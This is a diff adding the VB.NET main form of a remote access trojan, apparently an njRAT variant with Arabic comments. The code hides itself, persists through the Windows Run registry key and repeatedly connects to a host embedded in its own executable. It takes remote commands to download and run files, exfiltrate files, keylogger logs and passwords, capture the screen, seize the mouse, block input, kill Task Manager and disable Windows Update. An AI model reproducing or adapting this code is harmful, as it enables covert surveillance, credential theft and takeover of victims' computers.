@@ -1,0 +1,396 @@
+﻿Imports System.Globalization ' الفضاء الذي سساعدنا على جلب اسم الدوله
+Imports System.IO
+Imports Microsoft.Win32
+
+Public Class Form1
+    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
+
+    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
+    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
+    Public cap As New CRDP
+    Dim yy As String = "||"
+    Public WithEvents c As New SocketClient 'تعريف متغير من السوكت
+    Private culture As String = CultureInfo.CurrentCulture.EnglishName
+    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
+    Dim host As String
+    Dim port As Integer
+    Dim virus As String
+    Dim alaa(), text1, text2, text3 As String
+    Const spl As String = "abccba"
+    Dim pw As String
+    Dim o As New njLogger
+    Dim namev As String = "Name"
+    Dim vir As String = "2.0"
+    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
+    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
+
+
+
+
+
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+        End
+        o.Close(True)
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+
+
+        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
+        text1 = Space(LOF(1))
+        text2 = Space(LOF(1))
+        text3 = Space(LOF(1))
+
+
+        FileGet(1, text1)
+        FileGet(1, text2)
+        FileGet(1, text3)
+
+        FileClose()
+        alaa = Split(text1, spl)
+        host = alaa(1)
+        port = alaa(2)
+        virus = (alaa(3))
+        FileClose()
+        Me.Hide()
+        Timer1.Start()
+        pw = A.GT
+        o.Start()
+        Try
+            Dim StartupKey As String = "azoz"
+            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
+            regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
+        Catch : End Try
+
+
+
+      
+
+    
+    End Sub
+
+    Public Sub OpenCDDriveDoor()
+        Try
+            Call mciSendString("Set CDAudio Door Open", 0, 0, 0)
+        Catch ex As Exception
+
+        End Try
+    End Sub
+    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
+    Public Sub CloseCdDriveDoor()
+        Try
+            Call mciSendString("Set CDAudio Door Closed", 0, 0, 0)
+        Catch ex As Exception
+
+        End Try
+    End Sub
+   
+    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
+    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
+
+    Const TASKBAR_SHOW As Integer = &H40
+    Const TASKBAR_HIDE As Integer = &H80
+    'للأخفاء 
+    Public Sub HideTaskBar()
+        Dim TaskbarHandle As Long
+        TaskbarHandle = FindWindow("Shell_traywnd", "")
+        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
+    End Sub
+    'للأظهار
+    Public Sub ShowTaskBar()
+        Dim TaskbarHandle As Long
+        TaskbarHandle = FindWindow("Shell_traywnd", "")
+        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
+    End Sub
+    Private Sub data(ByVal b As Byte()) Handles c.Data
+        Dim ala As String() = Split(BS(b), "||") ' اريه من نوع سترينغ تقسم البانات القادمه اعتمادا على "||"
+        'جمله شرطيه بالاعتماد على اول كلمه يرسلها الكلاينت
+        Try
+            Select Case ala(0)
+                Case "chat"
+                    'Chat Modded By Simon-Benyo
+                    Invoke(New chatappd(AddressOf chatappds), ala(1), ala(2), ala(3))
+                Case "sendfile"
+                    IO.File.WriteAllBytes(IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(1))
+                Case "download"
+                    My.Computer.Network.DownloadFile(ala(1), IO.Path.GetTempPath & ala(2))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(2))
+                Case "closeserver"
+                    End
+                Case "restartserver"
+                    Application.Restart()
+                    End
+                Case "sendfileto" 'Coded By Volkano
+                    IO.File.WriteAllBytes(ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                Case "downloadfile" 'Coded By Volkano
+                    c.Send("downloadedfile" & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(ala(1))) & "||" & ala(2))
+               
+                Case "msgbox" 'Coded By Volkano
+                    Dim messageicon As MessageBoxIcon
+                    Dim messagebutton As MessageBoxButtons
+                    Select Case ala(1)
+                        Case "1"
+                            messageicon = MessageBoxIcon.Information
+                        Case "2"
+                            messageicon = MessageBoxIcon.Question
+                        Case "3"
+                            messageicon = MessageBoxIcon.Warning
+                        Case "4"
+                            messageicon = MessageBoxIcon.Error
+                    End Select
+                    Select Case ala(2)
+                        Case "1"
+                            messagebutton = MessageBoxButtons.YesNo
+                        Case "2"
+                            messagebutton = MessageBoxButtons.YesNoCancel
+                        Case "3"
+                            messagebutton = MessageBoxButtons.OK
+                        Case "4"
+                            messagebutton = MessageBoxButtons.OKCancel
+                        Case "5"
+                            messagebutton = MessageBoxButtons.RetryCancel
+                        Case "6"
+                            messagebutton = MessageBoxButtons.AbortRetryIgnore
+                    End Select
+                    MessageBox.Show(ala(4), ala(3), messagebutton, messageicon)
+                Case "openchat" 'Coded By Volkano
+                    c.Send("readytochat")
+                Case "stopchat" 'Coded By Volkano
+                    chat.Close()
+                Case "openurl" 'Coded By Volkano
+                    If ala(1) = "Default" Then
+                        Try
+                            System.Diagnostics.Process.Start(ala(2))
+                        Catch ex As Exception
+                        End Try
+                    Else
+                        Try
+                            System.Diagnostics.Process.Start(ala(1), ala(2))
+                        Catch ex As Exception
+
+                        End Try
+                    End If
+                Case "shutdowncomputer" 'Coded By Volkano
+                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
+                Case "restartcomputer" 'Coded By Volkano
+                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
+                Case "logoff" 'Coded By Volkano
+                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
+                Case "blockmouseandkeyboard" 'Coded By Volkano
+                    BlockInput(1)
+                    ShowCursor(0)
+                    taskmgrkiller.Start()
+                Case "unblockmouseandkeyboard" 'Coded By Volkano
+                    BlockInput(0)
+                    ShowCursor(1)
+                    taskmgrkiller.Stop()
+                Case "fun"
+                    c.Send("fun")
+                Case "tt"
+                    c.Send("tt")
+                Case "opentto"
+                    c.Send("opentto")
+                Case "TextToSpeech"
+                    Dim SAPI = CreateObject("SAPI.Spvoice")
+                    SAPI.speak(ala(1))
+
+                Case "Uninstall"
+                    End
+                Case "restart"
+                    Application.Restart()
+
+                Case "opentto"
+                    c.Send("opentto")
+                Case "TextToSpeech"
+                    Dim SAPI = CreateObject("SAPI.Spvoice")
+                    SAPI.speak(ala(1))
+              
+                Case "tt"
+                    c.Send("tt")
+
+
+
+                Case "NormalMouse"
+                    SwapMouseButton(&H0&)
+                Case "ReverseMouse"
+                    SwapMouseButton(&H100&)
+                Case "openkl"
+                    c.Send("openkl")
+                Case "getlogs"
+                    c.Send("logs" & "||" & o.Logs)
+
+                Case "openpw"
+                    c.Send("openpw")
+                Case "getpw"
+                    c.Send("getpw" & "||" & pw)
+
+                Case "s"
+                    HideTaskBar()
+                Case "s1"
+                    ShowTaskBar()
+
+                Case "لوحة1"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "لوحة2"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "وين1"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "0", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "وين2"
+                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "1", Microsoft.Win32.RegistryValueKind.DWord)
+                Case "creatnewfolder" 'Coded By Volkano
+                    Try
+                        My.Computer.FileSystem.CreateDirectory _
+        (ala(1))
+
+                    Catch ez As Exception
+                    End Try
+
+
+
+                Case "opencd" 'Coded By Volkano
+                    Try
+                        mciSendString("set cdaudio door open", 0, 0, 0)
+                    Catch ex As Exception
+                    End Try
+                Case "closecd" 'Coded By Volkano
+                    Try
+                        mciSendString("set cdaudio door closed", 0, 0, 0)
+                    Catch ex As Exception
+                    End Try
+                Case "\\"
+                    c.Send("\\")
+                Case "GetProcesses"
+                    Dim allProcess As String = ""
+                    Dim ProcessList As Process() = Process.GetProcesses()
+                    For Each Proc As Process In ProcessList
+                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
+                    Next
+                    c.Send("ProcessManager" & yy & allProcess)
+                Case "KillProcess"
+                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
+                    For i = 0 To eachprocess.Length - 2
+                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
+                            RunningProcess.Kill()
+                        Next
+                    Next
+
+                Case "info"
+                    c.Send("info" & "||" & virus & "||" & Environment.MachineName & "/" & Environment.UserName & "||" & My.Computer.Info.OSFullName & "||" & country & "||" & vir & "||" & getanti() & "||" & rams() & "GB")
+                Case "sendfile"
+                    IO.File.WriteAllBytes(IO.Path.GetTempPath & ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    Process.Start(IO.Path.GetTempPath & ala(1))
+
+                Case "GetDrives"
+                    c.Send("FileManager" & "||" & getDrives())
+                Case "FileManager"
+                    Try
+                        c.Send("FileManager" & "||" & getFolders(ala(1)) & getFiles(ala(1)))
+                    Catch
+                        c.Send("FileManager" & "||" & "Error")
+                    End Try
+                Case "sendfileto"
+                    IO.File.WriteAllBytes(ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    'dsfsadfasfas
+                Case "downloadedfile"
+                    IO.File.WriteAllBytes(Application.CommonAppDataPath & "\Computers\" & ala(2), Convert.FromBase64String(ala(1)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+
+                Case "Delete"
+                    Select Case ala(1)
+                        Case "Folder"
+                            IO.Directory.Delete(ala(2))
+                        Case "File"
+                            IO.File.Delete(ala(2))
+                    End Select
+                Case "Execute"
+                    Process.Start(ala(1))
+                Case "Rename"
+                    Select Case ala(1)
+                        Case "Folder"
+                            My.Computer.FileSystem.RenameDirectory(ala(2), ala(3))
+                        Case "File"
+                            My.Computer.FileSystem.RenameFile(ala(2), ala(3))
+                    End Select
+                Case "openfm"
+                    c.Send("openfm")
+
+
+                Case "!" ' server ask for my screen Size
+                    cap.Clear()
+                    Dim s = Screen.PrimaryScreen.Bounds.Size
+                    c.Send("!" & yy & s.Width & yy & s.Height)
+                Case "@" ' Start Capture
+                    Dim SizeOfimage As Integer = ala(1)
+                    Dim Split As Integer = ala(2)
+                    Dim Quality As Integer = ala(3)
+
+                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
+                    Dim M As New IO.MemoryStream
+                    Dim CMD As String = "@" & yy
+                    M.Write(SB(CMD), 0, CMD.Length)
+                    M.Write(Bb, 0, Bb.Length)
+                    c.Send(M.ToArray)
+                    M.Dispose()
+                Case "#" ' mouse clicks
+                    Cursor.Position = New Point(ala(1), ala(2))
+                    mouse_event(ala(3), 0, 0, 0, 1)
+                Case "$" '  mouse move
+                    Cursor.Position = New Point(ala(1), ala(2))
+
+
+              
+
+
+                Case "hidefolderfile" 'Coded By Volkano
+                    Dim hiden As FileAttribute = FileAttribute.Hidden
+                    Try
+                        SetAttr(ala(1), hiden)
+                    Catch ex As Exception
+
+                    End Try
+                Case "showfolderfile" 'Coded By Volkano
+                    Dim shown As FileAttribute = FileAttribute.Normal
+                    Try
+                        SetAttr(ala(1), shown)
+                    Catch ex As Exception
+                    End Try
+
+
+
+            End Select
+        Catch ex As Exception
+        End Try
+
+    End Sub
+
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        'جمله شرطيه تفيد اذا لم يكن السيرفر متصل فعاود الاتصال
+        If c.Statconnected = False Then
+            c.Connect(host, port)
+        End If
+    End Sub
+   Sub chatappds(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
+        chat.TextBox1.Text = chat.TextBox1.Text & data1 & " said : " & data3 & vbNewLine
+        chat.Text = data2
+        chat.Show()
+    End Sub
+
+    Function rams() As Integer
+        rams = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
+    End Function
+
+    Private Sub taskmgrkiller_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles taskmgrkiller.Tick
+        Try
+            Process.GetProcessesByName("taskmgr")(0).Kill()
+        Catch ex As Exception
+        End Try
+    End Sub
+
+End Class
